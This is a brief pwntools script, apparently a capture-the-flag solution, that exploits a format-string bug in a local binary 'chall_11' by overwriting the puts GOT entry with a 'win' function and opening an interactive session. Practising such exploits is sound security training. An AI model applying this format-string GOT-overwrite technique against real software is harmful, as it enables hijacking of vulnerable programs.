# coding: utf-8
from pwn import *
elf=ELF("./chall_11")
p=process("./chall_11")
p.recv()
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win}, write_size="byte")
p.sendline(payload)
p.interactive()
